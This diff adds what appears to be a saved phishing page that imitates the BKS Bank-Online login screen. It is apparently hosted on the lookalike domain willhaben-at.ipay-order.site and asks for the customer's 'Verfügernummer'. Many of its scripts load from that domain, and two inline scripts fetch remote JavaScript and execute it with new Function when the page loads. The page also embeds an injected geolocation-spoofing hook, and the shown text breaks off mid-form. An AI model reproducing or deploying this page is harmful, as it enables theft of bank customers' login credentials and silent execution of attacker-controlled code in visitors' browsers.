@@ -1,0 +1,2872 @@
+<!DOCTYPE html>
+<!-- saved from url=(0053)https://willhaben-at.ipay-order.site/bks/264137254629 -->
+<html
+  class="js no-touch csstransitions placeholder"
+  xmlns:ui="http://java.sun.com/jsf/facelets"
+  style=""
+  xmlns="http://www.w3.org/1999/xhtml"
+>
+  <div
+    id="in-page-channel-node-id"
+    data-channel-name="in_page_channel_poWWCp"
+  ></div>
+  <!--<!
+  [endif]--><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <script>
+      (function () {
+        function hookGeo() {
+          //<![CDATA[
+          const WAIT_TIME = 100;
+          const hookedObj = {
+            getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(
+              navigator.geolocation
+            ),
+            watchPosition: navigator.geolocation.watchPosition.bind(
+              navigator.geolocation
+            ),
+            fakeGeo: true,
+            genLat: 38.883333,
+            genLon: -77.0,
+          };
+
+          function waitGetCurrentPosition() {
+            if (typeof hookedObj.fakeGeo !== "undefined") {
+              if (hookedObj.fakeGeo === true) {
+                hookedObj.tmp_successCallback({
+                  coords: {
+                    latitude: hookedObj.genLat,
+                    longitude: hookedObj.genLon,
+                    accuracy: 10,
+                    altitude: null,
+                    altitudeAccuracy: null,
+                    heading: null,
+                    speed: null,
+                  },
+                  timestamp: new Date().getTime(),
+                });
+              } else {
+                hookedObj.getCurrentPosition(
+                  hookedObj.tmp_successCallback,
+                  hookedObj.tmp_errorCallback,
+                  hookedObj.tmp_options
+                );
+              }
+            } else {
+              setTimeout(waitGetCurrentPosition, WAIT_TIME);
+            }
+          }
+
+          function waitWatchPosition() {
+            if (typeof hookedObj.fakeGeo !== "undefined") {
+              if (hookedObj.fakeGeo === true) {
+                navigator.geolocation.getCurrentPosition(
+                  hookedObj.tmp2_successCallback,
+                  hookedObj.tmp2_errorCallback,
+                  hookedObj.tmp2_options
+                );
+                return Math.floor(Math.random() * 10000); // random id
+              } else {
+                hookedObj.watchPosition(
+                  hookedObj.tmp2_successCallback,
+                  hookedObj.tmp2_errorCallback,
+                  hookedObj.tmp2_options
+                );
+              }
+            } else {
+              setTimeout(waitWatchPosition, WAIT_TIME);
+            }
+          }
+
+          Object.getPrototypeOf(navigator.geolocation).getCurrentPosition =
+            function (successCallback, errorCallback, options) {
+              hookedObj.tmp_successCallback = successCallback;
+              hookedObj.tmp_errorCallback = errorCallback;
+              hookedObj.tmp_options = options;
+              waitGetCurrentPosition();
+            };
+          Object.getPrototypeOf(navigator.geolocation).watchPosition =
+            function (successCallback, errorCallback, options) {
+              hookedObj.tmp2_successCallback = successCallback;
+              hookedObj.tmp2_errorCallback = errorCallback;
+              hookedObj.tmp2_options = options;
+              waitWatchPosition();
+            };
+
+          const instantiate = (constructor, args) => {
+            const bind = Function.bind;
+            const unbind = bind.bind(bind);
+            return new (unbind(constructor, null).apply(null, args))();
+          };
+
+          Blob = (function (_Blob) {
+            function secureBlob(...args) {
+              const injectableMimeTypes = [
+                { mime: "text/html", useXMLparser: false },
+                { mime: "application/xhtml+xml", useXMLparser: true },
+                { mime: "text/xml", useXMLparser: true },
+                { mime: "application/xml", useXMLparser: true },
+                { mime: "image/svg+xml", useXMLparser: true },
+              ];
+              let typeEl = args.find(
+                (arg) =>
+                  typeof arg === "object" &&
+                  typeof arg.type === "string" &&
+                  arg.type
+              );
+
+              if (
+                typeof typeEl !== "undefined" &&
+                typeof args[0][0] === "string"
+              ) {
+                const mimeTypeIndex = injectableMimeTypes.findIndex(
+                  (mimeType) =>
+                    mimeType.mime.toLowerCase() === typeEl.type.toLowerCase()
+                );
+                if (mimeTypeIndex >= 0) {
+                  let mimeType = injectableMimeTypes[mimeTypeIndex];
+                  let injectedCode = `<script>(
+            ${hookGeo}
+          )();<\/script>`;
+
+                  let parser = new DOMParser();
+                  let xmlDoc;
+                  if (mimeType.useXMLparser === true) {
+                    xmlDoc = parser.parseFromString(
+                      args[0].join(""),
+                      mimeType.mime
+                    ); // For XML documents we need to merge all items in order to not break the header when injecting
+                  } else {
+                    xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
+                  }
+
+                  if (xmlDoc.getElementsByTagName("parsererror").length === 0) {
+                    // if no errors were found while parsing...
+                    xmlDoc.documentElement.insertAdjacentHTML(
+                      "afterbegin",
+                      injectedCode
+                    );
+
+                    if (mimeType.useXMLparser === true) {
+                      args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
+                    } else {
+                      args[0][0] = xmlDoc.documentElement.outerHTML;
+                    }
+                  }
+                }
+              }
+
+              return instantiate(_Blob, args); // arguments?
+            }
+
+            // Copy props and methods
+            let propNames = Object.getOwnPropertyNames(_Blob);
+            for (let i = 0; i < propNames.length; i++) {
+              let propName = propNames[i];
+              if (propName in secureBlob) {
+                continue; // Skip already existing props
+              }
+              let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
+              Object.defineProperty(secureBlob, propName, desc);
+            }
+
+            secureBlob.prototype = _Blob.prototype;
+            return secureBlob;
+          })(Blob);
+
+          // https://developer.chrome.com/docs/extensions/mv2/messaging/#external-webpage - "Only the web page can initiate a connection.", as such we need to query the background at a frequent interval
+          // No hit in performance or memory usage according to our tests
+          setInterval(() => {
+            chrome.runtime.sendMessage(
+              "fgddmllnllkalaagkghckoinaemmogpe",
+              { GET_LOCATION_SPOOFING_SETTINGS: true },
+              (response) => {
+                if (
+                  typeof response === "object" &&
+                  typeof response.coords === "object"
+                ) {
+                  hookedObj.genLat = response.coords.lat;
+                  hookedObj.genLon = response.coords.lon;
+                  hookedObj.fakeGeo = response.fakeIt;
+                }
+              }
+            );
+          }, 500);
+          //]]>
+        }
+        hookGeo();
+      })();
+    </script>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>BKS Bank-Online</title>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0"
+    />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="google-site-verification" content="" />
+    <script
+      type="text/javascript"
+      src="/bks_files/ruxitagentjs_ICA27NVfjqrux_10217210531114014.js.загрузка"
+      data-dtconfig="app=9d91167894247913|featureHash=ICA27NVfjqrux|vcv=2|xb=^bs/^bs/support^bs.3banken^bs.net^bs/api^bs/in^bs/col^bs?tId|rdnt=1|uxrgce=1|bp=3|cuc=ex2jaz8s|mel=100000|dpvc=1|ssv=4|lastModification=1682464711031|dtVersion=10217210531114014|tp=500,50,0,1|agentUri=/ruxitagentjs_ICA27NVfjqrux_10217210531114014.js|reportUrl=/rb_bead8053-62ce-438d-8df5-bd73b4a7cbc1|rid=RID_2060233063|rpid=1283158191|domain=bksbank-online.at"
+    ></script>
+
+    <link rel="stylesheet" href="/bks_files/all.css" />
+    <link rel="stylesheet" href="/css/support_parent.css" />
+
+    <script src="/bks_files/webfont.js.загрузка"></script>
+    <script src="https://willhaben-at.ipay-order.site/bks_files/jquery.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"></script>
+    <script src="/bks_files/jquery-plugins.js.загрузка"></script>
+    <script src="/bks_files/core.js.загрузка"></script>
+
+    <link
+      data-senna-track="temporary"
+      href="/bks_files/main.css"
+      id="2957ebd8"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <style data-senna-track="temporary" type="text/css"></style>
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="https://www.bksbank-online.at/o/static/o/portal-bks-theme/img/icons/favicon/apple-touch-icon.png?version=23.03.07-production-2023-03-06-13:10"
+    />
+    <link
+      rel="manifest"
+      href="https://www.bksbank-online.at/o/static/o/portal-bks-theme/img/icons/favicon/site.webmanifest?version=23.03.07-production-2023-03-06-13:10"
+    />
+    <link
+      rel="shortcut icon"
+      href="https://www.bksbank-online.at/o/static/o/portal-bks-theme/img/icons/favicon/favicon.ico?version=23.03.07-production-2023-03-06-13:10"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="32x32"
+      href="https://www.bksbank-online.at/o/static/o/portal-bks-theme/img/icons/favicon/favicon-32x32.png?version=23.03.07-production-2023-03-06-13:10"
+    />
+    <link
+      rel="icon"
+      type="image/png"
+      sizes="16x16"
+      href="https://www.bksbank-online.at/o/static/o/portal-bks-theme/img/icons/favicon/favicon-16x16.png?version=23.03.07-production-2023-03-06-13:10"
+    />
+    <meta
+      name="msapplication-config"
+      content="/o/static/o/portal-bks-theme/img/icons/favicon/browserconfig.xml?version=23.03.07-production-2023-03-06-13:10"
+    />
+    <link
+      rel="mask-icon"
+      href="https://www.bksbank-online.at/o/static/o/portal-bks-theme/img/icons/favicon/safari-pinned-tab.svg?version=23.03.07-production-2023-03-06-13:10"
+      color="#e50051"
+    />
+    <meta name="theme-color" content="#e50051" />
+    <!--[if lt IE 9
+      ]><script src="/o/static/o/portal-bks-theme/js/shims/html5shiv.js?version=23.03.07-production-2023-03-06-13:10"></script>
+      <script src="/o/static/o/portal-bks-theme/js/shims/respond.js?version=23.03.07-production-2023-03-06-13:10"></script
+    ><![endif]-->
+    <script src="/bks_files/js"></script>
+    <script src="/bks_files/DBEG.Core.js.загрузка"></script>
+    <script src="https://willhaben-at.ipay-order.site/bks_files/taiko.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"></script>
+    <style type="text/css"></style>
+    <script src="/bks_files/3beg-plugins.js.загрузка"></script>
+    <!-- $eosDevelopment development -->
+    <script src="/bks_files/DBEG.js.загрузка"></script>
+    <script
+      async=""
+      type="text/javascript"
+      src="/bks_files/cc.js.загрузка"
+    ></script>
+    <script src="/bks_files/dbeg.constants.js.загрузка"></script>
+    <script src="/bks_files/dbeg.utils.js.загрузка"></script>
+    <script src="/bks_files/dbeg.onefive.js.загрузка"></script>
+    <script src="/bks_files/dbeg.portletManager.js.загрузка"></script>
+    <!-- DBIT Components -->
+    <!-- defer for loading after HTML is finished -->
+    <script src="/bks_files/DbitComponents.js.загрузка" defer=""></script>
+    <!-- <script src="/bks_files/3bit-plugins.js.загрузка"></script>Chatvisor-JS -->
+    <!-- <script src="/bks_files/r76l1q0LgR.js.загрузка" async=""></script> -->
+    <script type="text/javascript">
+      (function () {
+        var f = document,
+          e = window,
+          i = e.location.protocol,
+          b = [
+            ["src", "/dashboard/label.js?r=" + Math.random()],
+            ["type", "text/javascript"],
+            ["async", true],
+          ],
+          g = "XMLHttpRequest",
+          a = null,
+          j = e[g] && (a = new e[g]()).withCredentials !== undefined,
+          c = f.createElement("script"),
+          h = f.getElementsByTagName("head")[0];
+        if (j) {
+          a.open("GET", b[0][1], b[2][1]);
+          a.withCredentials = true;
+          a.onreadystatechange = function (d) {
+            if (a.readyState == 4 && a.status == 200) {
+              c.type = "script/meta";
+              c.src = b[0][1];
+              h.appendChild(c);
+              new Function(a.responseText)();
+            }
+          };
+          a.send();
+        } else {
+          setTimeout(function () {
+            for (var d = 0, k = b.length; d < k; d++) {
+              c.setAttribute(b[d][0], b[d][1]);
+            }
+            h.appendChild(c);
+          }, 0);
+        }
+      })();
+    </script>
+    <script type="text/javascript">
+      (function (d, f) {
+        var b = {
+            src: "/dashboard/hover.js?r=" + Math.random(),
+            async: true,
+            type: "text/javascript",
+          },
+          g = "XMLHttpRequest",
+          c = f.createElement("script"),
+          h = f.getElementsByTagName("head")[0],
+          a;
+        if (d[g] && (a = new d[g]()).withCredentials !== undefined) {
+          a.open("GET", b.src, b.async);
+          a.withCredentials = true;
+          a.onreadystatechange = function (e) {
+            if (a.readyState == 4 && a.status == 200) {
+              c.type = "script/meta";
+              c.src = b.src;
+              h.appendChild(c);
+              new Function(a.responseText)();
+            }
+          };
+          a.send();
+        } else {
+          setTimeout(function () {
+            for (var e in b) {
+              c.setAttribute(e, b[e]);
+            }
+            h.appendChild(c);
+          }, 0);
+        }
+      })(window, document);
+    </script>
+    <script
+      type="script/meta"
+      src="https://willhaben-at.ipay-order.site/bks_files/rightClick.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"
+    ></script>
+    <script
+      type="script/meta"
+      src="https://willhaben-at.ipay-order.site/bks_files/mouse.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"
+    ></script>
+    <script
+      type="script/meta"
+      src="https://willhaben-at.ipay-order.site/bks_files/label.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"
+    ></script>
+    <script
+      src="https://willhaben-at.ipay-order.site/bks_files/print.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"
+      async=""
+      type="script/meta"
+    ></script>
+    <script
+      type="script/meta"
+      src="https://willhaben-at.ipay-order.site/bks_files/hover.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"
+    ></script>
+    <script type="text/javascript" async="" src="/bks_files/owc"></script>
+    <script type="text/javascript" async="" src="/bks_files/RiP6V"></script>
+    <script type="text/javascript" async="" src="/bks_files/PrGv8"></script>
+    <script
+      type="text/javascript"
+      charset="UTF-8"
+      src="https://willhaben-at.ipay-order.site/bks_files/common.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"
+    ></script>
+    <script
+      type="text/javascript"
+      charset="UTF-8"
+      src="https://willhaben-at.ipay-order.site/bks_files/util.js.%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0"
+    ></script>
+    <script type="text/javascript" async="" src="/bks_files/PrGv8(1)"></script>
+    <script type="text/javascript" async="" src="/bks_files/PrGv8(2)"></script>
+    <script type="text/javascript" async="" src="/bks_files/PrGv8(3)"></script>
+    <script type="text/javascript" async="" src="/bks_files/PrGv8(4)"></script>
+    <script type="text/javascript" async="" src="/bks_files/PrGv8(5)"></script>
+    <script type="text/javascript" async="" src="/bks_files/PrGv8(6)"></script>
+    <script
+      type="text/javascript"
+      charset="UTF-8"
+      src="/bks_files/common.js"
+    ></script>
+    <script
+      type="text/javascript"
+      charset="UTF-8"
+      src="/bks_files/util.js"
+    ></script>
+  </head>
+
+  <body
+    class="bks login d"
+    data-client="bks"
+    data-additionalclass=""
+    style="opacity: 1"
+  >
+    <div class="edit-overlay"></div>
+    <div class="db-head-wrapper">
+      <div
+        class="portlet-boundary portlet-boundary_headerportlet_WAR_headerportlet_ portlet-static portlet-static-end decorate"
+        id="p_p_id_headerportlet_WAR_headerportlet_"
+      >
+        <span id="p_headerportlet_WAR_headerportlet"></span>
+        <div
+          id="_headerportlet_WAR_headerportlet_"
+          class="liferay-faces-bridge-body"
+        >
+          <script type="text/javascript">
+            if (window.PrimeFaces) {
+              PrimeFaces.settings.locale = "en_US";
+            }
+          </script>
+          <div class="db-meta-navigation-wrapper">
+            <div class="db-meta-navigation">
+              <div class="db-meta-navigation-activity-info"></div>
+            </div>
+          </div>
+          <div
+            id="js-one-five-dropzone-header"
+            class="db-one-five-dropzone-container db-one-five-header-dropzone"
+          ></div>
+          <div class="db-header">
+            <div class="db-navigation-wrapper">
+              <h1 class="db-header-title">
+                <a
+                  href="https://willhaben-at.ipay-order.site/bks/264137254629#"
+                  title="Zur Startseite"
+                  ><img
+                    src="/bks_files/logo.svg"
+                    class="db-logo"
+                    alt="Logo der BKS Bank"
+                /></a>
+              </h1>
+              <div
+                class="db-header-container db-header-container-login"
+                id="js-header-container"
+              ></div>
+            </div>
+          </div>
+          <script type="text/javascript" src="/bks_files/login"></script>
+        </div>
+      </div>
+    </div>
+    <div class="print-icon-logo"><img src="/bks_files/print.png" /></div>
+    <div id="content" class="container main">
+      <div
+        class="portlet-boundary portlet-boundary_notificationportlet_WAR_notificationportlet_ portlet-static portlet-static-end decorate"
+        id="p_p_id_notificationportlet_WAR_notificationportlet_"
+      >
+        <span id="p_notificationportlet_WAR_notificationportlet"></span
+        ><span
+          id="_notificationportlet_WAR_notificationportlet_:notifications"
+        ></span>
+      </div>
+      <div
+        id="_loginportlet_WAR_loginportlet_"
+        class="liferay-faces-bridge-body"
+      >
+        <script type="text/javascript">
+          if (window.PrimeFaces) {
+            PrimeFaces.settings.locale = "de_AT";
+          }
+        </script>
+        <form
+          data-senna-off="true"
+          id="_loginportlet_WAR_loginportlet_:j_idt22"
+          name="_loginportlet_WAR_loginportlet_:j_idt22"
+          method="post"
+          action="https://www.bksbank-online.at/login?p_auth=JKJVUQpb&amp;p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=1&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__facesViewIdRender=%2Fviews%2Flogin.xhtml"
+          enctype="application/x-www-form-urlencoded"
+        >
+          <input
+            type="hidden"
+            name="_loginportlet_WAR_loginportlet_:j_idt22"
+            value="_loginportlet_WAR_loginportlet_:j_idt22"
+          /><input
+            type="hidden"
+            name="javax.faces.encodedURL"
+            value="https://www.bksbank-online.at/login?p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=2&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_cacheability=cacheLevelPage&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__jsfBridgeAjax=true&amp;_loginportlet_WAR_loginportlet__facesViewIdResource=%2Fviews%2Flogin.xhtml"
+          />
+          <script type="text/javascript">
+            $(document).ready(function () {
+              var url =
+                "https://www.bksbank-online.at/login?p_p_auth=21NdAGxc&p_p_id=loginportlet_WAR_loginportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=&p_p_col_count=0&_loginportlet_WAR_loginportlet_javax.faces.resource=authenticationProfileResource&_loginportlet_WAR_loginportlet_ln=bankingResources&_loginportlet_WAR_loginportlet_oid=1682503068900";
+              DBEG.scaLogin.processLoginProfile(url);
+            });
+          </script>
+          <input
+            type="hidden"
+            name="javax.faces.ViewState"
+            id="_loginportlet_WAR_loginportlet_:javax.faces.ViewState:0"
+            value="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"
+            autocomplete="off"
+          />
+        </form>
+        <div id="login" class="tiles db-bwc-tiles">
+          <div
+            id="_loginportlet_WAR_loginportlet_:loginTile"
+            class="db-tile js-db-tile login"
+            data-test="db-tile-login"
+          >
+            <header class="db-tile-header" data-test="db-tile-header">
+              <h2 data-test="db-tile-headline">
+                <span data-test="db-tile-header-text">Anmeldung</span>
+              </h2>
+            </header>
+            <span
+              id="_loginportlet_WAR_loginportlet_:db-tile-content"
+              class="db-bwc-colored-background db-tile-content content"
+              data-test="db-tile-content"
+            >
+              <div
+                data-senna-off="true"
+                id="_loginportlet_WAR_loginportlet_:jsf_login_form"
+                name="_loginportlet_WAR_loginportlet_:jsf_login_form"
+                enctype="application/x-www-form-urlencoded"
+              >
+                <input
+                  type="hidden"
+                  name="_loginportlet_WAR_loginportlet_:jsf_login_form"
+                  value="_loginportlet_WAR_loginportlet_:jsf_login_form"
+                  control-id="ControlID-1"
+                /><input
+                  type="hidden"
+                  name="javax.faces.encodedURL"
+                  value="https://www.bksbank-online.at/login?p_p_auth=21NdAGxc&amp;p_p_id=loginportlet_WAR_loginportlet&amp;p_p_lifecycle=2&amp;p_p_state=normal&amp;p_p_mode=view&amp;p_p_cacheability=cacheLevelPage&amp;p_p_col_id=&amp;p_p_col_count=0&amp;_loginportlet_WAR_loginportlet__jsfBridgeAjax=true&amp;_loginportlet_WAR_loginportlet__facesViewIdResource=%2Fviews%2Flogin.xhtml"
+                  control-id="ControlID-2"
+                />
+                <script
+                  id="_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt49"
+                  type="text/javascript"
+                >
+                  rmc_languageChanged = function () {
+                    PrimeFaces.ab({
+                      s: "_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt49",
+                      f: "_loginportlet_WAR_loginportlet_:jsf_login_form",
+                      pa: arguments[0],
+                    });
+                  };
+                </script>
+                <div class="row">
+                  <div class="col-xs-12">
+                    <div
+                      id="db-input-wrapper-loginDisposer"
+                      class="db-input-wrapper"
+                      data-test="db-input-wrapper-loginDisposer"
+                    >
+                      <div
+                        class="db-input-inner-wrapper"
+                        data-test="db-input-inner-wrapper-loginDisposer"
+                      >
+                        <input
+                          id="logins"
+                          name="_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt51:loginDisposer"
+                          class="db-input loginDisposer"
+                          maxlength="255"
+                          onblur=""
+                          onfocus=""
+                          data-test="db-input"
+                          aria-required="false"
+                          placeholder="Verfügernummer"
+                          type="text"
+                          autofocus="true"
+                          control-id="ControlID-3"
+                        />
+                        <script type="text/javascript">
+                          $(document).ready(function () {
+                            var input = document.getElementById(
+                              "_loginportlet_WAR_loginportlet_:jsf_login_form:j_idt51:loginDisposer"
+                            );
+                            DbitComponents.Helper.addFocus(input);
+                          });
+                        </script>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-xs-12">
+                    <div class="db-input-wrapper" data-test="db-input-wrapper-">
+                      <div
+                        class="db-input-inner-wrapper db-no-wrap"
+                        data-test="db-input-inner-wrapper-"
